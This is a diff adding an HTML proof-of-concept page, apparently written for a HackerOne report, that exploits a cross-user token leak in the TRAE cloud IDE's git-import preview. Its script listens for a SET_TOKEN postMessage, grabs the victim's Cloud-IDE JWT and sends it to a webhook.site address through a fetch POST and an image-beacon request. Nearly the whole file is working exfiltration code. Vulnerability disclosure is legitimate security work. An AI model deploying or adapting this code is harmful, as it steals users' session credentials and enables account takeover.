@@ -1,0 +1,36 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>loading</title></head>
+<body style="font-family:ui-monospace,Menlo,monospace;background:#0b0f0b;color:#d8f5dc;padding:18px;margin:0">
+<h3 style="color:#9fe8a9;margin:0 0 10px">TRAE git-import cross-user PoC &mdash; dontsaynetwork</h3>
+<pre id="s" style="font-size:13px;white-space:pre-wrap;word-break:break-all">waiting for the postMessage from work.trae.ai ...</pre>
+<script>
+// PoC by dontsaynetwork (HackerOne reporter id).  Public repo file, no account needed.
+// It only listens for the application broadcasting the account credential into the
+// preview frame.  No prompt injection, no AI/LLM feature is involved.
+var WH = 'https://webhook.site/c6d3dc1f-6393-4968-8683-2f98269d68f3';
+function show(t){ var e=document.getElementById('s'); if(e) e.textContent=t; }
+function exfil(tok, origin){
+  var body = 'Cloud-IDE-JWT ' + tok;
+  var q = '?origin=' + encodeURIComponent(origin) + '&len=' + tok.length + '&token=' + encodeURIComponent(tok);
+  try {
+    // simple cross-origin POST (text/plain is CORS-safelisted -> no preflight)
+    fetch(WH + '/set-token', {method:'POST', mode:'no-cors',
+                               headers:{'Content-Type':'text/plain;charset=UTF-8'},
+                               body: body});
+  } catch(e) {}
+  try { (new Image()).src = WH + '/set-token-img' + q; } catch(e) {}
+}
+addEventListener('message', function(e){
+  var d = e.data;
+  if(!d || d.type !== 'SET_TOKEN' || !d.data || !d.data.token) return;
+  var tok = d.data.token;
+  document.title = 'TOKEN_EXFILTRATED';
+  show('CAPTURED Cloud-IDE-JWT (' + tok.length + ' chars)\n'
+       + 'from origin: ' + e.origin + '\n\n'
+       + 'Cloud-IDE-JWT ' + tok + '\n\n'
+       + 'exfiltrating to: ' + WH);
+  exfil(tok, e.origin);
+  try { alert('CAPTURED Cloud-IDE-JWT (' + tok.length + ' chars)\nfrom ' + e.origin + '\n\nCloud-IDE-JWT ' + tok); } catch(x) {}
+});
+</script>
+</body></html>
